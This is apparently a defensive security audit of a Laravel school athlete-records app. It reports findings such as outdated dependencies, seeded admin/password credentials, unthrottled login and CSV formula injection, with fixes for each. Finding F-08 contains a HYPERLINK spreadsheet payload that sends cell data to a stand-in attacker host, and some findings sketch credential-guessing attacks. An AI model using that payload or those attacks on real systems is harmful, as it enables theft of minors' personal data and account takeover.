# SportsHub — Security Audit

| | |
|---|---|
| **Project** | SNNHS SportsHub (Progressive Web App for athlete records & sports activity management) |
| **Audited tree** | `C:\xampp\htdocs\SportsHub` |
| **Audit date** | 2026-11-03 |
| **Mode** | Read-only. No project file was modified, no migration/seed was run, no config changed. |
| **Stack verified** | PHP, Laravel 12.67.0, MySQL (prod) / SQLite (test), Blade, DomPDF 3.x, database sessions/cache/queue, service worker PWA |
| **Auditor** | Senior application security review (static + safe local tooling only) |

> **How this was performed.** I mapped every route in `routes/web.php`, `bootstrap/app.php`, all controllers in `app/Http/Controllers`, all models, services, notifications, the migrations, the Blade views, `public/` (service worker, manifest, `.htaccess`) and the git state. I ran `composer audit`, inspected `composer.lock`, and ran `php artisan test` (it uses an **in-memory SQLite** database per `phpunit.xml`, so it is non-destructive). Every finding below was traced from HTTP entry point → middleware → controller → query → view/response. Items I could not prove from code are explicitly marked **Needs runtime check**.

---

## 1. Executive summary

**Overall risk rating: HIGH.**
The application's *authorization logic* is unusually strong for a capstone project — I found **no working IDOR, no role-escalation path, no SQL injection, and no confirmed stored XSS**. The risk is concentrated in three places: an **unpatched Laravel framework advisory (critical)**, **default credentials in the database seeder**, and a **login endpoint with no throttling** that also **emails and logs the exact identifier** a guesser typed. For a system holding **minors' medical and identity documents**, those three issues alone are enough to fail a data-protection review.

### Top 5 issues

| # | Issue | Severity | Why it matters here |
|---|---|---|---|
| 1 | **Laravel 12.67.0 has 3 unpatched framework advisories** (auth-bypass, relationship data-destruction, debug XSS) plus Symfony/YAML/Markdown/Flysystem advisories | **Critical** | Framework-level flaws bypass all the careful controller checks below. |
| 2 | **Seeder creates `admin`/`password` and an athlete with `password`** | **Critical** (if seeded in production) | Full coordinator account = every minor's medical record. |
| 3 | **`POST /login` has no rate limit / lockout** | **High** | Unlimited password guessing against the two known usernames from #2. |
| 4 | **Failed-login handler emails the exact identifier typed (including for non-existent accounts) to every admin, and writes it verbatim to `laravel.log` when SMTP is unconfigured** | **High** (privacy) / Medium (security) | Any visitor can make the app page every coordinator, and student emails pile up in plaintext logs (RA 10173). |
| 5 | **A student whose password must be changed can still use every non-grouped authenticated route** (`/notifications*`, admin read-only routes return 403 but are reachable, notification redirect target is unvalidated) | **Medium** | `must_change_password` is only enforced by redirect, not by middleware on all routes. |

### In plain language (for the Sports Coordinator)

SportsHub is well built on the "who is allowed to do what" side — I tried to reach other students' profiles, medical records, certificates, applications and notifications by changing numbers in the URL, and every attempt was correctly blocked. The serious problems are elsewhere: the software framework the app is built on is **out of date and has a known critical security hole**, the **installer script creates an administrator account whose password is literally `password`**, and the **login page has no limit on wrong guesses**, so someone could sit at a computer and try millions of passwords. On top of that, every wrong password typed by **anyone on the internet** sends an alert email to all coordinators and can leave that person's email address in a plain text log file. Each of these is a short, low-risk fix, and they should be done **before the system is demonstrated or deployed**.

---

## 2. Findings table

Severity: **C** = Critical, **H** = High, **M** = Medium, **L** = Low, **I** = Info.
Status: **Conf** = Confirmed, **Likely**, **RT** = Needs runtime check.

| ID | Title | Sev | OWASP Top 10 | CWE | Status |
|----|-------|-----|--------------|-----|--------|
| **F-01** | Vulnerable Laravel/Symfony/YAML/Markdown/Flysystem dependency versions | **C** | A06 Vulnerable & Outdated Components | CWE-1104 | Conf (`composer audit`) |
| **F-02** | Default administrator & student credentials in `DatabaseSeeder` | **C** | A07 Identification & Auth Failures | CWE-798 | Conf |
| **F-03** | No rate limiting or account lockout on `POST /login` | **H** | A07 / A04 Insecure Design | CWE-307 | Conf |
| **F-04** | Failed-login emails exact identifier to every admin (sends to unknown accounts); username enumeration by design | **H** | A07 / A01 | CWE-204, CWE-203 | Conf |
| **F-05** | Full email addresses written to `laravel.log` on failed login when mailer is unconfigured | **H** | A09 Logging Failures | CWE-532 | Conf (log inspected) |
| **F-06** | `must_change_password` enforced by redirect middleware only on one route group; other authenticated routes remain usable | **M** | A07 / A01 | CWE-693 | Conf |
| **F-07** | Open redirect via stored notification `url` → `redirect()->to()` | **M** | A01 Broken Access Control | CWE-601 | Conf (logic) / RT (exploit) |
| **F-08** | CSV formula injection in `ReportController::export` (no cell sanitization) | **M** | A03 Injection | CWE-1236 | Conf |
| **F-09** | No rate limiting on public application form and its 3 file uploads | **M** | A04 / A05 | CWE-770 | Conf |
| **F-10** | Session cookies not `Secure`, session not encrypted, no HTTPS enforcement (`APP_URL` is `http://`) | **M** | A02 Cryptographic/Misconfig | CWE-319, CWE-614 | Conf (config) |
| **F-11** | No CSP; only basic headers set in `.htaccess` (which is bypassed if `public/` is not the document root) | **M** | A05 Security Misconfiguration | CWE-693 | Conf |
| **F-12** | `User::$fillable` exposes `role`, `status`, `must_change_password`, `sport_id` | **L** | A01 / A08 | CWE-915 | Conf (latent — no reachable path found) |
| **F-13** | DomPDF `allowed_protocols` allow `file://`, `http(s)://`, `data://`; `enable_javascript` on | **L** | A05 | CWE-918, CWE-611 | Conf (latent — `enable_remote=false`) |
| **F-14** | Missing auth views (`forgot-password`, `change-password`) → 500 on reset & forced-change flows (functional, listed for completeness) | **L** | A04 | CWE-754 | Conf (test run) |
| **F-15** | Password strength only `min:8` on all change/reset paths; no re-auth for sensitive admin actions | **L** | A07 | CWE-521 | Conf |
| **F-16** | Login form offers a "Remember me" token with default 5-year lifetime, on a shared-device school deployment | **L** | A07 | CWE-539 | Conf (config) |
| **F-17** | Service worker caches runtime navigations network-first (only public pages in practice) — verify no private page is ever a 200 HTML navigation at a non-denylisted path | **L** | A05 | CWE-525 | RT |
| **F-18** | No dedicated audit trail table for medical-record edits/approvals (relies on app log) | **L** | A09 Logging | CWE-778 | Conf |
| **F-19** | Community wiki: local DB `database/database.sqlite` and `storage/logs/laravel.log` present on disk — correct, but must never be copied to the server | **I** | A05 | CWE-538 | Conf |

> **Verified sound** (details in §4): object-level authorization across all student- and admin-facing routes, check-in rules, password reset token handling, CSRF, SQL construction, Blade output encoding, `{!! !!}` review, file storage on private disk + authorized download routes, upload MIME validation, ID randomness in temp passwords.

---

## 3. Detailed findings

### F-01 — Vulnerable dependency versions · **Critical** · Confirmed

**Location:** `composer.lock` — `laravel/framework v12.67.0`, `league/commonmark 2.10.0`, `league/flysystem 3.35.2`, `symfony/http-foundation v7.4.16`, `symfony/mime v7.4.16`, `symfony/yaml v7.4.15`.

**What is wrong (redacted `composer audit` output, 9 advisories):

| Package | Sev | Advisory | Fixed in |
|---|---|---|---|
| laravel/framework | **critical** | `CVE-2026-114509` TokenGuard auth bypass via non-string API credentials | **≥ 12.68.0** |
| laravel/framework | medium | `CVE-2026-114508` relationship inclusion → unauthorized data destruction | ≥ 12.68.0 |
| laravel/framework | low | `CVE-2026-102279` XSS in debug page information | ≥ 12.69.0 |
| symfony/http-foundation | high | `CVE-2026-108082` ReDoS in `HeaderUtils::split()` via `Cache-Control` header | ≥ 7.4.19 |
| symfony/yaml | high | `CVE-2026-109413` unbounded recursion in YAML lexer (DoS) | ≥ 7.4.18 |
| league/commonmark | high | `GHSA-3q6v-r5mr-hxv8` quadratic-time DoS in GFM table extension | ≥ 2.10.2 |
| league/commonmark | medium | `GHSA-97jj-33gv-5xf9` raw-HTML filter bypass | ≥ 2.10.2 |
| symfony/mime | medium | `CVE-2026-45070` header injection via MIME parameter names | ≥ 7.4.22 |
| league/flysystem | low | `CVE-2026-102601` path normalizer bypass with malformed UTF-8 | ≥ 3.35.3 |

**Reachability in this app.**
- The TokenGuard bypass is **not reachable today** — `config/auth.php` only defines the `session` guard. It remains a critical patch item because adding any API route in future would expose it instantly, and because the same framework version is affected by the data-destruction advisory, which *is* reachable through `back()`/form flows.
- `HeaderUtils::split()` on `Cache-Control` **is reachable** on every request (framework parses the request header) → remote DoS (ReDoS). Confirmed by code path, not by stress test (**Needs runtime check** for a practical payload).
- DomPDF renders Blade output through `league/commonmark` only if Markdown is used; certificate views do not use Markdown, so the Markdown DoS is **not** reachable in the PDF flow.
- `symfony/mailer` is used for every notification → `symfony/mime` header-injection advisory is relevant to the mail pipeline.

**Impact:** A coordinator workstation (Windows/XAMPP) or the school server can be crashed remotely (ReDoS/DoS), and any future framework feature can be silently exploitable. In an institution holding minors' records, a missing dependency patch is a reportable control failure.

**Fix:**
```bash
# composer.json already uses caret ranges, so a plain update is enough
composer update laravel/framework symfony/http-foundation symfony/mime symfony/yaml \
                 league/commonmark league/flysystem --with-dependencies
composer audit   # must print "No security vulnerability advisories found"
php artisan test # re-run the suite afterwards
```
Add a CI/pipeline step (or a pre-demo checklist item) that fails on `composer audit` exit code ≠ 0. Pin `"laravel/framework": "^12.69"` in `composer.json` to make the minimum explicit.

---

### F-02 — Default credentials in `DatabaseSeeder` · **Critical** (if seeded in prod) · Confirmed

**Location:** `database/seeders/DatabaseSeeder.php:28-41`
```php
User::updateOrCreate(['email' => 'admin@example.com'], [
    'name' => 'Admin User', 'role' => 'Administrator', 'username' => 'admin',
    'password' => Hash::make('password'),          // ← default password
]);
User::updateOrCreate(['email' => 'student@example.com'], [
    'name' => 'Juan Dela Cruz', ... 'username' => 'juan.delacruz',
    'password' => Hash::make('password'),
]);
```
The `composer.json` script `post-create-project-cmd` runs `artisan migrate` (not `db:seed`), but the README/demo workflow and `composer setup` make it easy to run `php artisan db:seed` on the same MySQL database as production. `DatabaseSeeder` is not guarded by `app()->environment('production')`.

**Attack scenario:** Student or any visitor tries `/login` with `role=Administrator`, `username=admin`, `password=password`. Full coordinator access: every medical record, every application document (birth certificate, parent's consent), ability to reset every athlete password.

**Impact:** Complete compromise of the crown jewels (minors' medical and identity documents). Highest realistic impact in the whole assessment.

**Fix:**
```php
// database/seeders/DatabaseSeeder.php
public function run(): void
{
    // Refuse to create demo accounts outside local/testing.
    if (! app()->environment(['local', 'testing'])) {
        $this->command?->warn('DatabaseSeeder is disabled outside local/testing.');
        return;
    }
    // … existing demo data …
}
```
And create the real coordinator account manually with a strong password, `must_change_password = true`, and **change any account already seeded**. Add a startup check that fails fast if `users` contains `admin@example.com` in production.

---

### F-03 — No rate limiting or lockout on login · **High** · Confirmed

**Location:** `routes/web.php:54-97` — the `POST /login` closure has no `throttle:` middleware; the only throttled routes in the entire app are `/forgot-password` and `/reset-password` (`routes/web.php:105-113`). No `RateLimiter::for('login', …)` is defined in `AppServiceProvider`.

```php
Route::post('/login', function () {
    ...
    if ($user && Hash::check($credentials['password'], $user->password)) { ... }
    ...
})->name('login.submit');   // ← no ->middleware('throttle:...')
```

The failed-login service applies its own 5-minute throttle, but that only throttles **emails**, not password attempts. Username/email are guessable (school email convention, plus the seeded `admin`/`juan.delacruz`), and password rules are only `min:8`.

**Attack scenario:** Scripted guessing against `admin` / `coordinator@…` at network speed. With F-02 the first guess succeeds; without it, guessing still continues indefinitely.

**Impact:** Account takeover of a coordinator (→ full medical-record access) or of an athlete account (→ impersonation, check-in fraud).

**Fix** (Laravel-idiomatic, keyed on identifier + IP so both directions are limited):
```php
// app/Providers/AppServiceProvider.php (boot)
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Cache\RateLimiting\Limit;

RateLimiter::for('login', function (Request $request) {
    $key = Str::lower(trim((string) $request->input('username'))).'|'.$request->ip();
    return [
        Limit::perMinute(5)->by($key),
        Limit::perMinute(20)->by($request->ip()),
    ];
});
```
```php
// routes/web.php
Route::post('/login', /* … */)->middleware('throttle:login')->name('login.submit');
```
Return `429` with a generic "Too many attempts, try again later" message; keep the same generic error text for bad credentials.

---

### F-04 — Failed-login emails the exact identifier typed to every administrator · **High** (privacy & enumeration) · Confirmed

**Location:**
- `app/Services/FailedPasswordAttemptService.php:44-59` — `reportLoginFailure()` calls `warnCoordinators()` **even when `$account` is `null`** (identifier not found).
- `app/Services/FailedPasswordAttemptService.php:96-112, 135-153` — `details()` includes `'identifier' => $identifier` (raw) and `'account_email' => $account?->email`; coordinators are **all** Administrator users, throttled per IP only.
- `app/Notifications/FailedPasswordAttemptNotification.php:41-42, 65` — the email body prints `• Account: … (email)` and `• Identifier used: <raw input>`.
- `app/Services/FailedPasswordAttemptService.php:236-241, 280-291` — when the SMTP mailer has no credentials, the warning is **written to the application log** with the raw identifier (see F-05).

**What is wrong.** A deliberate username-enumeration path was built in: typing `somebody@school.ph` with a wrong password produces a coordinator email whose `Account:` line says "No matching account" or gives the real account **and its email address**. Anyone on the internet can trigger this, and the response is throttled only per source IP for mail, not per identifier.

**Attack scenario**
1. Attacker submits a list of candidate emails with wrong passwords (5-minute windows).
2. Coordinators receive up to N alert emails naming which addresses are real accounts — mailbox spam + leaked enrolment list + staff distraction ("alert fatigue" so real attacks are ignored).
3. With no login throttle (F-03), the same attacker continues guessing.

**Impact:** Disclosure of the enrolled-student email list (personal data), DoS of coordinator mailboxes, weakened detection of genuine attacks. RA 10173: unnecessary processing and disclosure of personal data collected for another purpose.

**Fix:**
1. Do **not** email on unknown identifiers. In `reportLoginFailure()`, only call `warnCoordinators()` when `$account !== null`; maintain a counter for unknown identifiers instead (see below).
2. Replace the raw identifier in the email with a masked value (the log already has `maskIdentifier()`; reuse it).
3. Aggregate: send one digest every 15–60 minutes listing masked identifiers, not one mail per attempt.

```php
// FailedPasswordAttemptService::reportLoginFailure()
if ($account) {
    $details = $this->details($account, $identifier, $role, $request,
                             mask: self::maskIdentifier($identifier));
    $this->logAttempt('sign-in', $details);
    if ($this->shouldWarnAccountOwner($account)) { $this->send(...); }
    $this->warnCoordinators('login', $details, $request);
} else {
    // Count only; do not disclose the guesser's input to staff.
    $this->countAttempt(null, $request);
}
```

---

### F-05 — Email addresses written in clear text to `storage/logs/laravel.log` · **High** · Confirmed

**Location:** `app/Services/FailedPasswordAttemptService.php:233-251` and `:280-291`.

````php
private function send(User $recipient, Notification $notification, string $recipientRole): void
{
    if (! $this->mailerIsConfigured()) {
        Log::warning(sprintf(
            'Incorrect password warning for the %s was not emailed … The warning was written here instead: %s',
            $recipientRole,
            $this->describe($notification),   // contains $details['identifier'] unmasked
        ));
        return;
    }
    ...
}
````

Confirmed in the live log: **139** matching entries, e.g. (identifier redacted here):
```
[…][local].WARNING: Incorrect password warning for the account holder was not emailed
because the "smtp" mailer has no credentials. The warning was written here instead:
login attempt for "<full email address>" from 127.0.0.1.
```
The file is `8.8 MB` and is git-ignored, but it sits inside the Laravel project, which is exactly the directory often zipped for defense/demo sharing.

**Impact:** Directory of student and staff emails in plaintext; if any other code logs tokens (none found), same exposure. RA 10173 security-measure failure.

**Fix:** mask before logging (already exists as `maskIdentifier`) and add a logging formatter that redacts emails; rotate/delete the existing log.
```php
Log::warning(sprintf(
    'Incorrect password warning for the %s was written to the log instead of email: %s attempt for %s from %s.',
    $recipientRole,
    $context,
    self::maskIdentifier((string) ($details['identifier'] ?? 'unknown')),
    $details['ip'] ?? 'unknown',
));
```
Operationally: `del storage\logs\laravel.log` after deployment, set `LOG_LEVEL=warning` (already set), and consider `LOG_STACK=daily` with a 14-day retention.

---

### F-06 — `must_change_password` is enforced by redirect, not on every authenticated route · **Medium** · Confirmed

**Location:** `app/Http/Middleware/ForcePasswordChangeMiddleware.php:24-40` (whitelist of only `student.change-password`, `student.change-password.update`, `logout`), applied **only to the group at `routes/web.php:389-573`**.

Outside that group these authenticated routes are live while `must_change_password` is still true:

| Route | Line | What a forced-user can do |
|---|---|---|
| `POST /notifications/{id}/read`, `GET /notifications/{id}`, `POST /notifications/read-all` | `571-581`, `588-602` | read own notifications only (scoped) — low impact, but confirms the bypass |
| `GET /notifications` | `606-620` | own feed only |
| Admin routes (`/dashboard`, `/applications`, `/applications/{id}` …) | `838-854`, `916-918` | `ensureAdministrator()` returns 403, so **no data leak**, but the route surface is exposed |
| `GET /student/change-password` | `571` | intended |

Also, the *login* redirect to `student.change-password` (`routes/web.php:74-76`) only triggers for `role === 'Student'`.

**Attack scenario / impact:** A student holding a one-time temporary password (printed/handwritten by the coordinator) can ignore the forced-change sheet and keep using the temp password for `/notifications` and receive/mark notifications, and the account stays on a coordinator-generated (weaker, human-shared) password indefinitely. The admin routes correctly 403, so **no cross-role leak is possible** — this is a hardening/control-integrity issue, not a data breach.

**Fix:** apply the middleware to the entire authenticated surface via the router, and remove the group-local use:
```php
// bootstrap/app.php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->alias(['force.password.change' => ForcePasswordChangeMiddleware::class]);
    $middleware->appendToGroup('web', \App\Http\Middleware\ForcePasswordChangeMiddleware::class);
})
```
(Keep the existing allow-list; it already excludes logout and the change-password routes.)

---

### F-07 — Stored notification URL used in `redirect()->to()` · **Medium** · Confirmed by code / needs runtime check for exploitability

**Location:** `routes/web.php:588-595`
```php
Route::get('/notifications/{notification}', function (string $notification) {
    $record = auth()->user()->notifications()->whereKey($notification)->firstOrFail(); // ✔ scoped
    $target = data_get($record->data, 'url') ?: route('notifications.index');
    $record->markAsRead();
    return redirect()->to($target);   // no scheme/host check
});
```

Objects-level access is **correct** — the lookup is scoped to the signed-in user. The `url` stored in `data` is always produced server-side today (`route('student.…')`), so there is **no user-controlled path into it from the current code** (I checked every `->notify(...)` call site). It becomes a real open redirect if any future feature copies request input into `$meta['url']`.

**Impact if it becomes reachable:** phishing (`/notifications/{id}` → attacker site), plus the `markAsRead()` side effect before redirecting.

**Fix:** constrain the target to same-origin app URLs.
```php
$target = (string) data_get($record->data, 'url', '');
if (! Str::startsWith($target, url('/')) && ! Str::startsWith($target, '/')) {
    $target = route('notifications.index');
}
return redirect()->to($target);
```

---

### F-08 — CSV formula injection in the Reports export · **Medium** · Confirmed

**Location:** `app/Http/Controllers/ReportController.php:117-153` — writes raw row values:
```php
fputcsv($handle, array_map(fn (array $column) => (string) ($row[$column['key']] ?? ''), $payload['columns']));
```
`AttendanceController` (lines 237-244) **does** implement `csvCell()` for formula characters; `ReportController` does not.

**Attack scenario:** A student edits their own profile name / email / phone to `=HYPERLINK("http://evil.example/?x="&A1,"Click")` (allowed: `ProfileController` accepts `name` up to 255 chars, `email`, `phone`). The coordinator downloads "Athletes" CSV in Excel → formula evaluates in the administrator's Excel context and can exfiltrate neighbouring cells (student IDs, emails, phone numbers) to a remote host.

**Impact:** Mass exfiltration of athlete PII from the coordinator's workstation; RA 10173 breach.

**Fix:** reuse the existing helper (extract it to a tiny service or trait so both controllers share it):
```php
// ReportController::export() row loop
fputcsv($handle, array_map(
    fn (array $column) => $this->sanitizeCsvCell((string) ($row[$column['key']] ?? '')),
    $payload['columns'],
));

private function sanitizeCsvCell(string $value): string
{
    return preg_match('#^[=+\-@\t\r\n]#', $value) ? "\t".$value : $value;
}
```
Optionally prefix the export with `"sep=,"` or instruct staff to open with Data → From Text; sanitization is the real control.

---

### F-09 — Public application form and uploads are unthrottled · **Medium** · Confirmed

**Location:** `routes/web.php:123-127` (`GET/POST /apply`), `ApplicationController::store` (`:124-148`) — 3× up to 5 MB files per submission (`mimes:pdf,jpg,jpeg,png`, `max:5120`). No `throttle:` middleware.

**Attack scenario:** An unauthenticated attacker posts thousands of applications with 15 MB of files each: fills the disk and floods the pending-review queue, hiding genuine applications (and the coordinator must open each one). **Needs runtime check** for the actual disk quota; the missing control itself is confirmed.

**Fix:**
```php
Route::post('/apply', [ApplicationController::class, 'store'])
    ->middleware('throttle:3,10')   // 3 submissions per 10 minutes per IP
    ->name('application.store');
```
Consider a captcha/quiz question on the public form, and move uploads for deeper storage once the queue is > N.

---

### F-10 — Transport hardening: HTTP-only base URL, cookies not `Secure`, session not encrypted · **Medium** · Confirmed (config)

**Location:**
- `config/session.php:172` → `'secure' => env('SESSION_SECURE_COOKIE')` and `.env` does not define `SESSION_SECURE_COOKIE` → cookie sent over plain HTTP.
- `config/session.php:50` → `SESSION_ENCRYPT=false`.
- `.env` → `APP_URL=http://localhost/SportsHub/public` (heavily indicative of HTTP-only deployment), `APP_ENV=production`, `APP_DEBUG=false` (good).
- No `withMiddleware(fn ($m) => $m->trustProxies(...))` and no `forceScheme('https')` in `bootstrap/app.php`.

**Impact:** Cookies (including the long-lived "remember me" token, F-16) traverse the network in clear text on the school LAN / Wi-Fi; a passive observer can hijack an authenticated session. Without HTTPS, HSTS cannot be used either.

**Fix:**
- Serve over HTTPS (school may need a cert; Let's Encrypt or a self-signed cert plus browser enrolment; or terminate TLS at a reverse proxy).
- In production `.env`: `SESSION_SECURE_COOKIE=true`, `SESSION_SAME_SITE=lax` (default, already), `APP_URL=https://…`, `SESSION_ENCRYPT=true`.
- In `AppServiceProvider::boot()`: `if (app()->environment('production')) URL::forceScheme('https');`
- Keep the app server bound to `127.0.0.1` or the LAN interface only; never expose XAMPP's status page.

---

### F-11 — No Content-Security-Policy; security headers depend on `.htaccess` · **Medium** · Confirmed

**Location:** `public/.htaccess:50-57` sets `X-Content-Type-Options`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy`. No `Content-Security-Policy` and no `Strict-Transport-Security`. `bootstrap/app.php` has an empty exception handler and no security-header middleware. If the school deploys with the project root as the document root (common on XAMPP), `public/.htaccess` is bypassed entirely and **none** of these headers apply.

**Impact:** Missing defence-in-depth against XSS (all blade output I reviewed is escaped so no confirmed XSS, but a future template could introduce one). The `.htaccess` dependency is a deployment footgun.

**Fix:** ship headers in a global middleware so they apply regardless of web-server config.
```php
// bootstrap/app.php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->append(function ($request, Closure $next) {
        $response = $next($request);
        $response->headers->set('Content-Security-Policy',
            "default-src 'self'; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; script-src 'self'; font-src 'self' data:; frame-ancestors 'self'; base-uri 'self'; form-action 'self'");
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
        return $response;
    });
})
```
Deploy with `public/` as the document root (or a vhost pointing there). Verify with `curl -I`.

---

### F-12 — Over-broad `User::$fillable` · **Low** (latent) · Confirmed

**Location:** `app/Models/User.php:17`
```php
protected $fillable = ['name','email','username','role','status','sport_id','student_id',...,
                       'password','must_change_password'];
```
Nowhere in the app is `User::create()`/`fill()`/'update()` fed `$request->all()` — `AthleteController::store` builds an explicit array with `role => 'Student'` (`:99-107`), the profile update uses an explicit whitelist (`ProfileController:48-56`), and athlete update uses a validated whitelist (`AthleteController:136-152`). So there is **no privilege-escalation path today**. But a single future `$user->update($request->validated())` on this model would silently allow `role=Administrator` / `status=…` and **`must_change_password=false`**.

**Fix:** keep `role`, `status`, `student_id`, `must_change_password`, `sport_id` out of `$fillable` and set them through `forceFill()` in the admin flows (`AthleteController` already uses `forceFill` for password/must_change). Add a feature test asserting a student's `PATCH /student/profile` with `role=Administrator` in the payload leaves their role as `Student`.

---

### F-13 — DomPDF allows `file://`, `http(s)://`, `data://` and JavaScript · **Low** (latent) · Confirmed

**Location:** `config/dompdf.php:93-98` (`allowed_protocols`), `:253` (`enable_javascript => true`), `:275` (`enable_remote => false` — good), `:81` (`chroot => realpath(base_path())` — the **whole project root**, including `.env`). The certificate views are rendered from DB fields (escaped via Blade), and the `logo_src` is a server-side `public_path()`, so there is **no user-controlled URL reaching DomPDF today**.

**Risk:** if a future certificate/report template interpolates an uploaded image URL or unescaped text, `file://` + a wide chroot would allow reading `.env`/`APP_KEY` and SSRF. `enable_javascript=true` is generally unnecessary for print PDFs.

**Fix:** tighten to what the app needs.
```php
'allowed_protocols' => ['data://' => ['rules' => []]],   // inline images only
'enable_javascript' => false,
'chroot' => realpath(public_path()),
```
and keep rendering only server-resolved values into the template.

---

### F-14 — Missing auth views break password reset and forced change (`View [auth.forgot-password] not found`) · **Low** (functional/availability) · Confirmed

**Location:** `app/Http/Controllers/Auth/PasswordResetController.php:41` renders `auth.forgot-password`; `ChangePasswordController::show()` renders `auth.change-password`. Both files are **deleted in the working tree** (`git status` shows ` D resources/views/auth/forgot-password.blade.php`, ` D resources/views/auth/change-password.blade.php`). `php artisan test` → `2 failed, 335 passed`, both failures are this missing view (`PasswordResetTest::test_forgot_password_page_renders` → `500`).

**Impact:** An athlete who clicks "Forgot password" gets a 500 page; a forced-password-change account is redirected to a 500 page, so the mandatory change flow cannot complete. Not a confidentiality/integrity issue, but it blocks an account-recovery security control: the coordinator has to reset passwords by hand.

**Fix:** restore both views (`git restore resources/views/auth/forgot-password.blade.php resources/views/auth/change-password.blade.php`) before deployment, and add both routes to the smoke test.

---

### F-15 — Weak password policy and no re-auth for high-impact admin actions · **Low** · Confirmed

**Location:** `ChangePasswordController:37`, `ProfileController:99`, `PasswordResetController:128` — all use `'min:8'` without symbols/compromise checks; admin-assisted resets set `must_change_password` but the temporary password is 16 chars with all classes (fine). Resetting an athlete password, deleting a medical record, or issuing certificates needs only the existing session — no password re-entry (`config/auth.php:115` `password_timeout` is defined but no `password.confirm` middleware is used).

**Impact:** Weak passwords survive; a stolen coordinator session can perform destructive actions without re-authentication. Combined with F-03 this compounds.

**Fix:** use `Password::min(10)->mixedCase()->numbers()->symbols()->uncompromised()` (Laravel's `PasswordRule`) and add `'password.confirm'` middleware to `/admin/medical/*` write routes and `/athletes/{athlete}/password-reset`.

---

### F-16 — "Remember me" token with default 5-year lifetime on shared devices · **Low** · Confirmed (config)

**Location:** `routes/web.php:71` (`auth()->login($user, request()->boolean('remember'))`), default `remember` lifetime in `config/auth.php` (`'remember' => env('AUTH_REMEMBER_COOKIE_LIFETIME', 576000)` = 5 years). Login form presents "Remember me" (`resources/views/auth/login.blade.php:44-49`) to **students on shared school computers**.

**Impact:** A student who ticks it and then walks away leaves a 5-year credential on a shared machine. Logout does invalidate it server-side (`auth()->logout()` regenerates the token), but a user who only closes the browser does not.

**Fix:** set `AUTH_REMEMBER_COOKIE_LIFETIME=20160` (14 days) in `.env`; consider hiding "Remember me" for `Student` logins; keep `SESSION_LIFETIME` at 120 min (already).

---

### F-17 — Service worker caching scope · **Low** · Needs runtime check

**Location:** `public/sw.js:23-31` (app shell = `/`, `offline.html`, `manifest.webmanifest`, 3 CSS files, favicon), `:75-98` (denylist of private prefixes), `:142-159` (`networkFirst` caches any same-origin 200 basic response).

**What is right:** non-GET requests are never cached (`:84`), the denylist includes `/dashboard`, `/student*`, `/admin*`, `/applications*`, `/athletes*`, `/sports*`, `/coaches*`, `/events*`, `/notifications*`, `/login`, `/logout`, password routes. Only public pages (`/`, `/apply`) reach `networkFirst`. **No authenticated HTML, API/JSON or document download is placed in cache by the current routing** — certificate/pdf/document routes are all under `/student/*`, `/admin/*`, `/applications/*`, `/athletes/*`, `/sports/*`, so they are skipped.

**Residual risk:** The match is `endsWith(prefix) || includes(prefix.'/')`, not a path-segment anchor, and any future 200-HTML navigation outside the list (e.g. `/apply/success`, `/reports`) would be cached on a shared device; `caches` is not cleared at logout.

**How to verify (runtime):** log in as a student on Chrome → DevTools ▸ Application ▸ Cache Storage. Confirm only `snnhs-sportshub-static-v4`/`runtime-v4` contain public assets and the landing page; navigate `/student/*`, `/dashboard`, a certificate download, then check no entry was added. Then logout and confirm no authenticated HTML remains.

**Fix (hardening):** clear the runtime cache on logout, and in `networkFirst` only cache when `request.mode === 'navigate'` **and** the path is in an explicit public allowlist (`['/', '/apply', '/offline.html']`).

---

### F-18 — Thin audit trail for sensitive admin actions · **Low** · Confirmed

**Location:** `AthleteController:178` logs (via `Log::info`) only athlete password resets, in the application log. There is **no audit table** for: approving/rejecting applications (`ApplicationController::applyStatus`), editing/deleting medical records and incidents, issuing/regenerating certificates, changing attendance statuses, or viewing sensitive documents. `review_history` and `handled_by`/`handled_at` exist on applications and certificate requests (good partial trace) but are editable by the same admin.

**Impact:** After an incident (e.g. a coordinator viewed a record they shouldn't), the school cannot reconstruct who did what and when — required for RA 10173 accountability.

**Fix:** add an `audit_logs` table (`user_id`, `action`, `subject_type`, `subject_id`, `changes` JSON, `ip`, `created_at`) and write to it from the mutating admin actions; make it append-only. Keep passwords/tokens out of `changes`.

---

### F-19 — Local artefacts on disk (informational) · **Info** · Confirmed

`database/database.sqlite` exists locally (untracked), `storage/logs/laravel.log` is 8.8 MB, and uploaded student documents exist under `storage/app/private/application-documents/*` (untracked). All three are correctly **not in git** (`.gitignore` lines 3, 18–21; `storage/logs/.gitignore` ignores all). Keep it that way: never include `database/` or `storage/` in a zip submitted for defence or copied to the server; the private documents contain minors' birth certificates.

---

## 4. Verified-OK list (controls checked and found sound)

These were explicitly traced and are **not** findings. They are listed so the team knows what was covered and should not be “re-litigated”.

**Authorization / IDOR**
- Every student page under `/student*` calls `abort_unless(auth()->user()?->role === 'Student', 403)` (`$studentPage`, routes `:230-232`), or the student-only controller checks (`ProfileController:137-140`, `ChangePasswordController:74-77`, `SportController::studentMembers/studentMemberProfile:135,235`).
- Every admin controller action calls a private `ensureAdministrator()` (or the `view-medical-details` Gate) **first**: `AthleteController`, `SportController`, `MedicalController`, `MedicalIncidentController`, `ApplicationController`, `AttendanceController`, `AchievementController`, `CertificateRequestController`, `CoachController`, `EventController`, `ReportController`. Verified per method, not just in constructors.
- Student achievement lookups use a scope: `Achievement::query()->forAthlete($student)->findOrFail($id)` (`Achievement.php:95-98`, routes `:355-358, :394, :434`) → changing the id returns a 404. Certificates are additionally restricted to `forStudent($student)` + `STATUS_ISSUED` (`routes:401-406`).
- Certificate request ownership is re-checked server-side: `CertificateRequestController::guardRelationships` (achievement must belong to the request's student) and `ensureNotOwnRequest`.
- Notifications are always resolved through `auth()->user()->notifications()` (`routes:577,590,599,611`) → no polymorphic cross-user read/mark. `markAsRead()` is scoped by the same relation.
- Application documents: download route requires Administrator (`routes:846-854`), the path comes only from a whitelist of three columns, and the file is served from the private disk with a non-guessable stored name.
- Medical certificates: served only through `MedicalController::{viewCertificate,downloadCertificate}` after `ensureAdministrator()`; `X-Content-Type-Options: nosniff` and `Cache-Control: private, no-store` on inline view.
